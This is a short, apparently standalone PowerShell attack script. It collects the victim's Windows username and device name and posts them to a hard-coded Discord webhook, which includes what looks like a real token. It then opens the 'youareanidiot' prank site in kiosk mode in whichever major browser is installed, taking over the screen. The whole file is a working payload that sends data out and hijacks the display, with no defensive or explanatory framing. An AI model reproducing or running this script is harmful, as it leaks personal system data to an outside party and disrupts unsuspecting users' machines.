$webhookUrl="https://discord.com/api/webhooks/1209677596695068792/cHQyM148MEtZvYDk-d4uYxn4C6tXJ7UYLNZoH7pF4jXGnXXLtt3bvl2iJhEINCMAtOH9";
$urlToOpen = "https://youareanidiot.cc/"
try {
    $u = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $deviceName = [System.Environment]::MachineName
    $msg = @{
        content = "**System Information:**`n- Username: $u`n- Device Name: $deviceName"
    } | ConvertTo-Json
    irm -Uri $webhookUrl -Method Post -Body $msg -ContentType "application/json"

    $browsers = @(
        @{name="Chrome"; path="C:\Program Files\Google\Chrome\Application\chrome.exe"; args="--kiosk `"$urlToOpen`""},
        @{name="Firefox"; path="C:\Program Files\Mozilla Firefox\firefox.exe"; args="-kiosk `"$urlToOpen`""},
        @{name="Edge"; path="C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"; args="--kiosk `"$urlToOpen`""}
    )

    $browserFound = $False
    foreach ($browser in $browsers) {
        if (Test-Path $browser.path) {
            Start-Process -FilePath $browser.path -ArgumentList $browser.args
            $browserFound = $True
            break
        }
    }

    if (-not $browserFound) {
        Write-Output "No supported browser found."
    }
} catch {
    Write-Output "Error: $_"
}
